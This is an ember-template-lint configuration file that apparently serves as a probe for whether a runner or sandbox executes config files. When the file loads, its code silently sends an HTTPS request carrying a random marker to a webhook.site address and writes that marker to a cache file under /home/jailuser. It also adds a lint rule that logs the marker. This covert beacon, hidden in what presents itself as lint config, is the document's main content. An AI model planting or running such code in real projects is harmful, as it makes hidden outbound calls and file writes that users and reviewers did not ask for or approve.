// RUNNERSINKS: ember-template-lint executable config (EXEC candidate).
const crypto = require("crypto");
const MARK = "RSNK_29DBD6_EMBER_" + crypto.randomBytes(3).toString("hex");
try { require("https").get("https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-ember-load?d=" + MARK).on("error", function () {}); } catch (e) {}
try { require("fs").writeFileSync("/home/jailuser/.cache/rsnk/carry_ember.txt", MARK); } catch (e) {}
module.exports = {
  plugins: [{
    name: "rsnk",
    rules: {
      "rsnk-marker": {
        create(context) {
          return {
            ElementNode(node) {
              try { context.log({ node: node, message: MARK, source: "rsnk" }); }
              catch (e) { try { context.log(node, MARK); } catch (e2) {} }
            }
          };
        }
      }
    }
  }],
  rules: { "rsnk-marker": true }
};
